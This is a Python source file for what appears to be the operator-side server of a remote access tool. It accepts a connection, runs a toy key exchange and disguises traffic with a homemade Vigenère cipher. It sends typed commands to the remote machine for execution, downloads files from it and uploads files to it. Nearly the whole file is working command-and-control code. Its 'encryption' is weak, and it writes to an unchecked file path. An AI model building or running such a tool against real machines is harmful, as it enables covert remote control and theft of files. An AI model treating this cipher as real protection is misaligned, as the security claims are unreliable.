#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
    File name: server.py
    Author: MathIsSimple
    Python Version: 3.7.0
    Build Version: 1.2
'''

# Import needed core python modules

import requests
import socket
import random
import string
import time
import json
import re

from sys import argv
from os  import walk
from os  import path
from os  import mkdir

# Global Variables

characters    = "\"\\?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/;:.,éè'!&+*|`^@[]=#~-_<>(){}§$%µ£¤ç "
bits_per_char = len(bin(len(characters))) - 2
config  = json.load(open("res/config.json"))
HOST = config["host"]
PORT = config["port"]
CMDS = config["commands"]

g = int(random.uniform(100, 7000))
n = config["n"]
p = int(random.uniform(1, n))

g_step_1  = (g**p) % n
key       = 0
square    = ""
cipher    = ""

# File Manager Functions

def createSquare():
    square = [[" "] * len(characters)] * len(characters)

    for i in range(len(characters)):
        square[i] = characters[i:] + characters[:i]
    
    return square

def createSquare():
    square = [[" "] * len(characters)] * len(characters)

    for i in range(len(characters)):
        square[i] = characters[i:] + characters[:i]
    
    return square

def createCipher(key):
    return characters[:key % len(characters)]

def createEndCipher(cipher, message):
    i = 0
    endCipher = ""
    for p_i in range(len(message)):
        if i >= len(cipher):
            i = 0
        endCipher = endCipher + cipher[i]
        i = i + 1
    return endCipher

def VigenenereEncrypt(message):
    global alphabet
    global square
    global cipher

    endCipher = createEndCipher(cipher, message)

    output = ""
    index  = 0
    for char in message:
        indexInAlphabetOfMessageChar = -1
        indexInAlphabetOfCipherChar  = -1
        i = 0
        for letter in characters:
            if char == letter:
                indexInAlphabetOfMessageChar = i

            if endCipher[index] == letter:
                indexInAlphabetOfCipherChar  = i

            if indexInAlphabetOfCipherChar != -1 and indexInAlphabetOfMessageChar != -1:
                break
            
            i = i + 1
        
        if indexInAlphabetOfMessageChar == -1:
            print("One of the characters in your message is not in the alphabet")
        else:
            output = output + square[indexInAlphabetOfMessageChar][indexInAlphabetOfCipherChar]
        
        index = index + 1
    return output

def VigenenereDecrypt(message):
    global alphabet
    global square
    global cipher

    endCipher = createEndCipher(cipher, message)

    output = ""
    index  = 0
    for char in message:
        indexInAlphabetOfCipherChar  = -1
        i = 0
        for letter in characters:
            if endCipher[index] == letter:
                indexInAlphabetOfCipherChar  = i
                break
            
            i = i + 1
        
        if indexInAlphabetOfCipherChar == -1:
            print("One of the characters in your message is not in the alphabet")
        else:
            search = square[indexInAlphabetOfCipherChar]
            out    = ""
            i = 0
            for letter in search:
                if letter == char:
                    out = characters[i]
                    break
                i = i + 1
            output = output + out
        
        index = index + 1
    return output

# Hasing Functions

def modify(message):
    output = ""

    for l in message:
        index  = characters.find(l)
        index2 = len(characters) - 1 - index
        letter = characters[index2]
        output = output + letter
    
    return output

def longify(message):
    output = ""
    for char in message:
        bin_number = str(bin(characters.find(char)))[2:]
        for i in range(bits_per_char - len(bin_number)):
            bin_number = "0" + bin_number
        output = output + bin_number
    return output

def delongify(message):
    output = ""
    for i in range(int(len(message) / bits_per_char)):
        char   = int(message[i * bits_per_char:i * bits_per_char + bits_per_char], 2)
        output = output + characters[char]
    return output

def encrypt(message):
    output = message[::-1]
    output = VigenenereEncrypt(output)

    return output

def decrypt(message):
    output = VigenenereDecrypt(message)
    output = output[::-1]

    return output

# Create Socket Connection

def createConnexion(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen()
    conn, addr = sock.accept()

    return (sock, conn, addr)

def getTime():
    return int(round(time.time() * 1000))

def send(data):
    conn.sendall(encrypt(str(data)).encode())

def receiveData():
    rcv = decrypt(conn.recv(1024).decode("utf-8", "ignore"))

    return rcv

def convert_to_bytes(no):
    result = bytearray()
    result.append(no & 255)
    for i in range(3):
        no = no >> 8
        result.append(no & 255)
    return result

def bytes_to_number(b):
    res = 0
    for i in range(4):
        res += b[i] << (i*8)
    return res

print("The server is now running.. Awating connections")

sock, conn, addr = createConnexion(HOST, PORT)

print("At any time, you can type HELP to get the list of supported commands")

print("\n\n")

receivingInfo   = True
sendingCommands = False
diffie = True

while True:
    if diffie:
        conn.send(str(g).encode())
        time.sleep(0.2)
        conn.send(str(n).encode())
        time.sleep(0.2)
        conn.send(str(g_step_1).encode())

        while True:
            data = conn.recv(1024).decode()
            if data != "":
                key    = (int(data)**p) % n
                diffie = False
                square = createSquare()
                cipher = createCipher(key)
                print("Key : " + str(key))
                break

        print("\n")
    
    if receivingInfo:
        received = receiveData()
        if received != "END":
            print(received)
        else:
            receivingInfo   = False
            sendingCommands = True
            print("\n")
        
    if sendingCommands:
        command = input("Command To Execute ")
        if command == "END":
            send("END")
            sock.close()
            exit(0)
        elif command == "HELP":
            print("\nNow Prining all supported commands\n")
            for command in CMDS:
                name = command["name"]
                desc = command["desc"]

                print("Name : " + str(name))
                print("Desc : " + str(desc))
                print("\n")
        else:
            last_rcv_time = getTime()

            send(command)

            if command.startswith("download") == True:
                output_file_size = 0
                current_size   = 0
                buffer         = b""

                doStop = False

                while True:
                    data = conn.recv(1024).decode()

                    if data != "":
                        if data == "STOP UPLOAD PROCESS":
                            doStop = True
                    break

                if doStop == True:
                    continue
                
                output_file = open("./downloads/" + command[len("download")+1:], "wb+")

                time.sleep(0.1)

                while True:
                    data = conn.recv(4)

                    if data != "":
                        output_file_size = bytes_to_number(data)
                        break

                while current_size < output_file_size:
                    data = conn.recv(1024)

                    if not data:
                        break

                    if len(data) + current_size > output_file_size:
                        data = data[:output_file_size - current_size]
                    
                    buffer       += data
                    current_size += len(data)

                output_file.write(buffer)
                output_file.close()
            elif command.startswith("upload") == True:
                i = input("Input File : ")
                
                input_file_location = "./uploads/" + i

                if path.isfile(input_file_location) == False:
                    conn.send("STOP UPLOAD PROCESS".encode())
                    print("\nThis file doesn't exist (check the spelling and if it in the server/uploads folder)\n")
                    continue

                o = input("Output File : ")

                conn.send(o.encode())

                input_file_size = path.getsize(input_file_location)
                input_file      = open(input_file_location, "rb")

                conn.send(convert_to_bytes(input_file_size))
                time.sleep(0.2)

                data = input_file.read(1024)

                while True:
                    conn.send(data)
                    data = input_file.read(1024)
                        
                    if not data:
                        break
                        
                input_file.close()

                print("Success !")
            else:
                while True:
                    current_time = getTime()
                    if (current_time - last_rcv_time >= 2000):
                        break
                    
                    received = receiveData()

                    if received != "":
                        last_rcv_time = getTime()

                        if received != "END":
                            print(received)
                        else:
                            break